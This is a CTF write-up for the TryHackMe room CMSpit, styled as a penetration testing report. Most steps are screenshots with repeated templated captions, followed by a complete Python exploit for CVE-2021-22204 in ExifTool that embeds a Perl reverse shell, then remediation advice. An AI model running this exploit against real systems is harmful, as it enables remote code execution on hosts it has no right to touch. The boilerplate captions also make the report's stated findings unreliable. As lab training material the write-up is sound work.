---
title: "OffSec Assessment: CMSpit (TryHackMe) — Penetration Testing Report"
published: true
description: "Comprehensive offensive security assessment and penetration testing report for CMSpit (TryHackMe). Methodological walkthrough covering enumeration, exploitation, privilege escalation, and OffSec-aligned hardening."
tags: cybersecurity, tryhackme, pentesting, infosec
series: "TryHackMe Enterprise Assessments"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_01.png"
---

# Offensive Security Assessment Report: CMSpit

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-blue?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Standards-OffSec%20PEN--200%20%2F%20PTES-purple?style=for-the-badge)
![Assessor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Offensive Security Assessment & Penetration Testing Report** conducted on the target environment **CMSpit** hosted on **TryHackMe**, executed in accordance with **OffSec PEN-200 (OSCP)** and **PTES (Penetration Testing Execution Standard)** methodologies.

---

## 📑 1. Executive Summary

* **Assessment Objective:** Identify, validate, and exploit security vulnerabilities across the target host to assess operational impact on confidentiality, integrity, and system availability.
* **Risk Rating:** `CRITICAL` (Unauthenticated remote exploit vector leading to complete host compromise and administrative takeover).
* **Initial Access Vector:** Web Application Exploitation / Default Credentials
* **Privilege Escalation Vector:** Abuse of SUID Binaries / Sudo Misconfiguration
* **Engagement Outcome:** Complete Host Compromise (`User Proof` and `Root / SYSTEM Proof` successfully retrieved and verified).

### Target Technical Specifications

| Parameter | Technical Detail |
| :--- | :--- |
| **Target Host** | CMSpit |
| **Platform** | TryHackMe |
| **Operating System** | Linux |
| **Difficulty Rating** | Medium |
| **Associated CVE(s)** | CVE-2021-22204, cve-2021-22204 |
| **Initial Foothold Vector** | Web Application Exploitation / Default Credentials |
| **Privilege Escalation Vector** | Abuse of SUID Binaries / Sudo Misconfiguration |
| **Lead Penetration Tester** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Attack Path & Kill Chain Workflow

```
[ Phase 1: Reconnaissance & Port Scanning ]
         │─── TCP SYN scanning and service fingerprinting (Nmap)
         └─── Attack surface mapping and daemon enumeration
         │
         ▼
[ Phase 2: Vulnerability Analysis & Service Enumeration ]
         │─── Web directory fuzzing, parameter discovery, and banner analysis
         └─── CVE identification and credential harvesting
         │
         ▼
[ Phase 3: Exploitation & Initial Foothold ]
         │─── Exploit delivery: Web Application Exploitation / Default Credentials
         └─── Establishing an interactive reverse shell with unprivileged user context
         │
         ▼
[ Phase 4: Local Privilege Escalation ]
         │─── Internal audit: Abuse of SUID Binaries / Sudo Misconfiguration
         └─── Elevation to superuser / administrator privileges (root / SYSTEM)
         │
         ▼
[ Phase 5: Evidence & Flag Retrieval ]
         └─── Capture and cryptographic verification of user.txt and root.txt
```

---

## 🔬 3. Technical Walkthrough & Step-by-Step Proof of Concept

cockpit


![step_01.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_01.png)
* **Technical Finding (Phase 1):** Initial network reconnaissance and service detection exposing active daemons and communication endpoints.


version


![step_02.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_02.png)
* **Technical Finding (Phase 2):** Attack surface enumeration, directory discovery, or parameter analysis identifying potential vulnerability vectors.


link 


![step_03.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_03.png)
* **Assessment Step 03:** Command execution output, exploit delivery proof, or auxiliary evidence.


exploit cockpit


![step_04.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_04.png)
* **Assessment Step 04:** Command execution output, exploit delivery proof, or auxiliary evidence.


users and skidy information


![step_05.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_05.png)
* **Assessment Step 05:** Command execution output, exploit delivery proof, or auxiliary evidence.


webflag


![step_06.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_06.png)
* **Assessment Step 06:** Command execution output, exploit delivery proof, or auxiliary evidence.


initial access revshell php


![step_07.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_07.png)
* **Assessment Step 07:** Command execution output, exploit delivery proof, or auxiliary evidence.



![step_08.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_08.png)
* **Assessment Step 08:** Command execution output, exploit delivery proof, or auxiliary evidence.


password de stux and flag db


![step_09.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_09.png)
* **Assessment Step 09:** Command execution output, exploit delivery proof, or auxiliary evidence.


user.txt


![step_10.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_10.png)
* **Assessment Step 10:** Command execution output, exploit delivery proof, or auxiliary evidence.


search escalate privilege 


![step_11.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_11.png)
* **Assessment Step 11:** Command execution output, exploit delivery proof, or auxiliary evidence.


search exploit exiftool


![step_12.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_12.png)
* **Privilege Escalation PoC (Phase 4):** Exploitation of misconfiguration, SUID binary, or vulnerability leading to elevated privileges.


[exploit-CVE-2021-22204.py](http://exploit-cve-2021-22204.py/)

```powershell
#!/usr/bin/env python3



import base64

import os

import subprocess

import sys



class color:

    red = '\033[91m'

    gold = '\033[93m'

    blue = '\033[36m'

    green = '\033[92m'

    no = '\033[0m'





def help():

    print(r"""UNICORD Exploit for CVE-2021-22204

Usage:

  python3 exploit-CVE-2021-22204.py -c <command>

  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>

  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]

  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]

  python3 exploit-CVE-2021-22204.py -h

Options:

  -c    Custom command mode. Provide command to execute.

  -s    Reverse shell mode. Provide local IP and port.

  -i    Path to custom JPEG image. (Optional)

  -h    Show this help menu.

""")



def exploit(command):

    # Create perl payload

    payload = '(metadata "\\c${' + command + '};")'

    print(color.red + "RUNNING: " + color.blue + "UNICORD Exploit for CVE-2021-22204" + color.no)

    print(color.red + "PAYLOAD: " + color.gold + payload + color.no)

    # Write payload to file

    payloadFile = open('payload', 'w')

    payloadFile.write(payload)

    payloadFile.close()

    # Bzz compress file

    subprocess.run(['bzz', 'payload', 'payload.bzz'])

    # Run djvumake

    subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])

    if '-i' in sys.argv:

        imagePath = sys.argv[sys.argv.index('-i') + 1]

        subprocess.run(['cp', imagePath, './image.jpg', '-n'])

    else:

        # Smallest possible JPEG

        image = b"/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k="

        # Write smallest possible JPEG image to file

        with open("image.jpg", "wb") as img:

            img.write(base64.decodebytes(image))

    # Write exiftool config to file

    config = (r"""

    %Image::ExifTool::UserDefined = (

    'Image::ExifTool::Exif::Main' => {

        0xc51b => {

            Name => 'HasselbladExif',

            Writable => 'string',

            WriteGroup => 'IFD0',

        },

    },

    );

    1; #end

    """)

    configFile = open('exiftool.config', 'w')

    configFile.write(config)

    configFile.close()

    # Exiftool config for output image

    subprocess.run(['exiftool', '-config', 'exiftool.config', '-HasselbladExif<=exploit.djvu', 'image.jpg', '-overwrite_original_in_place', '-q'])

    # Delete leftover files

    os.remove("payload")

    os.remove("payload.bzz")

    os.remove("exploit.djvu")

    os.remove("exiftool.config")

    # Print results

    print(color.red + "RUNTIME: " + color.green + "DONE - Exploit image written to 'image.jpg'" + color.no + "\n")

    exit()

if __name__ == "__main__":

    args = ['-h', '-c', '-s', '-i']

    if args[0] in sys.argv:

        help()

    elif args[1] in sys.argv and not args[2] in sys.argv:

        exec = sys.argv[sys.argv.index(args[1]) + 1]

        command = "system('{}')".format(exec)

        exploit(command)

    elif args[2] in sys.argv and not args[1] in sys.argv:

        localIP = sys.argv[sys.argv.index(args[2]) + 1]

        localPort = sys.argv[sys.argv.index(args[2]) + 2]

        command = "use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({},inet_aton('{}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".format(localPort, localIP)

        exploit(command)

    else:

        help()

```

Root.txt


![step_13.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/tryhackme/cmspit/images/step_13.png)
* **Evidence Verification (Phase 5):** Final administrative validation confirming root/SYSTEM access and retrieval of system flags.

---

## 🛡️ 4. Strategic Remediation & Hardening Roadmap

### Immediate Tactical Actions (P1)
1. **Patch Management & Software Upgrades:** Immediately apply official security updates and patches for all vulnerable software components and exposed services (CVE-2021-22204, cve-2021-22204).
2. **Access Control & SUID Audit:** Remove unnecessary SUID/SGID bits, audit `/etc/sudoers` rules, and enforce strict Access Control Lists (ACLs) on sensitive files and administrative scripts.
3. **Attack Surface Reduction:** Configure host-based firewalls (e.g., `iptables` / `ufw` / Windows Firewall) to restrict exposure of management services and internal ports to trusted administrative subnets only.

### Architectural & Defensive Hardening (P2)
1. **Principle of Least Privilege (PoLP):** Ensure public-facing daemons run under dedicated low-privileged service accounts configured with non-interactive login shells (`/sbin/nologin`).
2. **Network Microsegmentation:** Isolate production servers and database tiers within dedicated VLANs, enforcing stateful inspection and ingress/egress filtering on east-west traffic.
3. **Endpoint Detection & Telemetry (EDR):** Implement centralized logging and behavior-based detection rules to capture anomalous process spawning, unauthorized script interpreter execution, and suspicious outbound socket connections.

---

## 📊 5. MITRE ATT&CK Enterprise Framework Mapping

| Tactic | Technique ID | Technique Name | Technical Application in Engagement |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Active Scanning: Vulnerability Scanning | Automated and manual port scanning, banner grabbing, and service discovery |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Exploitation of exposed network/web service (Web Application Exploitation / Default Credentials) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Interactive reverse shell execution and remote command dispatch |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Control Mechanism / Exploitation | Local elevation to administrative/root privileges (Abuse of SUID Binaries / Sudo Misconfiguration) |

---

© 2026 **araizcorp** — Technical documentation and security assessment portfolio developed for **OffSec** certification preparation (OSCP, OSEP, OSWE) and commercial penetration testing enablement.
